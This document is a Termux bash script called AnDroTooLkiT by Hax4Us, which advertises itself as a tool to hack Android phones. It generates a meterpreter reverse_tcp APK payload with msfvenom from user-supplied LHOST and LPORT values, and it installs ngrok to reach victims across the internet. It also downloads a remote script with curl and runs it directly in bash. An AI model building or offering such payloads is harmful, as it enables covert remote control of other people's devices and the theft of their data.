#!/data/data/com.termux/files/usr/bin/bash
clear
check=0
ok="nok"
ENTER="press ENTER for main menu"
#colours
cyan='\033[1;36m'
green='\033[1;32m'
red='\033[1;31m'
yellow='\033[1;33m'
blue='\033[1;34m'
purple='\033[1;35m'
reset='\033[0m'
echo -e "$cyan          ========================"
echo -e "\033[1;31m                   Hax4Us"
echo -e "$cyan          ========================"
echo
echo -e "          ========================"
echo -e "$red              AnDroTooLkiT V1.0"
echo -e "$cyan          ========================"
echo
echo -e "$green Welcome friends , i know you are here to perform various tasks to hack android phone using your termux :D\nSo yes you are at right place"
echo
echo -e "$red Press ENTER to continue"
read tmp
echo -e "$yello MAIN MENU"
echo -e "$red -----------"
echo -e "$purple 1) Create payload"
echo -e " 2) Install ngrok (important for hacking android on WAN)"
echo -e " 3) Install metasploit"
echo -e " 4) About"
echo -e " 5) Credits"
echo -e " 6) Contact hax4us$reset"
echo
read option
if [[ $option == "" ]];
then
	echo -e "$red Please enter valid number of choice"
	echo
	echo -e "$green Plz wait... You are redirecting to main menu"
	sleep 2
	androtoolkit
fi
check_dependencies()
{
	echo -e "$green checking metasploit ..."
	sleep 1
     if [ -f $PREFIX/bin/msfconsole ]; then
	     echo -e "$cyan OK$reset"
	     ok="ok"
     else
	     echo
	     echo -e "$red please make sure metasploit is installed by my official script if not so please select 3 for metasploit."
	     echo
	    echo -e "$yellow $ENTER$reset"
	    read tmp
	    androtoolkit
	  fi
	  if [ $ok = "ok" ];
	  then
	$PREFIX/bin/sed -i '3 a check=1' $HOME/androtoolkit/androtoolkit.sh

fi
}

install_metasploit()
{
echo -e "$green it can take upto 10-15mins and also depends on your net speed"
sleep 1
find . -type f -name metasploit-framework\* -exec rm {} \;
if [ -e $PREFIX/bin/curl ]; then
#meta link
curl -LO https://raw.githubusercontent.com/Hax4us/Metasploit_termux/master/metasploit.sh
bash metasploit.sh
echo
echo -e "$red if you dont think , all were ok so try again with fast internet"
echo -e "$green $ENTER$reset"
read tmp1
else 
	apt install curl
	echo -e "$green it can take upto 10-15mins and also depends on your net speed"
	sleep 1
	find . -type f -name metasploit-framework\* -exec rm {} \;
		#meta link
		curl -LO https://raw.githubusercontent.com/Hax4us/Metasploit_termux/master/metasploit.sh
		bash metasploit.sh
		echo
		echo -e "$red if you dont think , all were ok so try again with fast internet"
	echo -e "$green $ENTER$reset"
	read tmp2
	androtoolkit
fi
}

create_payload()
{
 echo -e "$green Give following details"
 echo -e "----------------------"
 echo -e "$yello 1) LHOST ="
 read lhost
 echo -e " 2) LPORT ="
 read lport
 echo -e " 3) FINAL APK NAME ="
 read apkname
 if [ -L $PREFIX/bin/msfvenom ];
 then
	 echo -e "$cyan Please Wait ..."
	 msfvenom -p android/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport R > $HOME/payload/$apkname.apk > /dev/null 2>&1
	echo
	echo -e "$green Payload Created Successfully in androtoolkit/payload folder"
	echo -e "$purple:)$reset"
else
	echo
	echo -e "$red Msfvenom was not found :("
	echo
	echo -e "$green Please install metasploit using 3rd option"
	echo
	echo -e "$yello $ENTER$reset"
	read tmp3
	androtoolkit
fi
}

install_ngrok()
{
if [ -e $PREFIX/bin/curl ];
then
	curl -LO https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip
	apt install unzip
	unzip ngrok-stable-linux-arm.zip
	mv ngrok $PREFIX/bin/
	chmod +x $PREFIX/bin/ngrok
	echo
	echo -e "$green Ngrok is installed :)"
	echo 
	echo -e "$green Plz wait...you are redirecting to main menu$reset"
	sleep 1
	androtoolkit
else
	apt install curl
	curl -LO https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip
	apt install unzip
	unzip ngrok-stable-linux-arm.zip
	mv ngrok $PREFIX/bin/
	chmod +x $PREFIX/bin/ngrok
	echo
	echo -e "Ngrok is installed :)"
	echo
	echo -e "Plz wait...you are redirecting to main menu$reset"
	sleep 1
	androtoolkit
fi

}

about()
{
	echo -e "$yello It's a tool to provide friendly user interface :) My aim behind this tool is to make things easy like payload creation , metasploit installation and ngrok installation & maybe i can update my tool with some extra features$reset"
}

credits()
{
echo -e "$yellow Credit goes to Lokesh @Hax4Us$reset"
}

contact()
{
echo -e "$green Want to contact me ?"
echo -e "$yellow press ENTER"
read tmp4
echo -e "$green My Fb id :- lokesh.pandey.5473"
echo -e "$yellow $ENTER$reset"
read tmp5
androtoolkit
}
case "$option" in
	1) if [ $check = 0 ];
		then
			check_dependencies
			fi
			create_payload
		;;
	2) install_ngrok
		;;
	3) install_metasploit
		;;
	4) about
		;;
	5) credits
		;;
	6) contact
		;;
esac
